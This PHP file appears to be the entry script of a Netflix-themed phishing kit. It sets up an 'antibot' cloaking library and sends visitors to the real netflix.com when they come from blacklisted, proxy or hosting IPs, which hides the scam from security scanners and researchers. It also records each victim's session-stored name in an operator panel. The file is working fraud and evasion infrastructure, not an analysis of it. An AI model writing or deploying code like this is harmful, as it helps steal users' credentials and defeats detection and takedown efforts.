<?php 
session_start();
require (__DIR__).'/config.php';
require_once (__DIR__).'/lib/user_panel.php';
require (__DIR__).'/lib/frm.php';

require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$bm->setExitLink("https://www.netflix.com");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);

if(strtolower($antibot)=="yes"){
$bm->run();
}

$list = explode(",", file_get_contents((__DIR__)."/blacklisted_ips.txt"));
foreach($list as $bip){
    if($_SERVER['REMOTE_ADDR']==trim($bip)){
        header("location:".$bm->EXIT_LINK);
    }
}

if(strtolower($block_proxy)=="yes"){
    $proxy = $bm->getIpInfo('proxy');
    $hosting = $bm->getIpInfo('hosting');
    
    if($proxy OR $hosting){
        $bm->killBot("Detected proxy/hosting.");
        die(header("location: ".$bm->EXIT_LINK));
    }
    
}
     

 

$nameHint = trim((($_SESSION['_first-name'] ?? '') . ' ' . ($_SESSION['_last-name'] ?? '')));
panelTouchUser($nameHint, basename($_SERVER['PHP_SELF'] ?? 'index.php'));

?>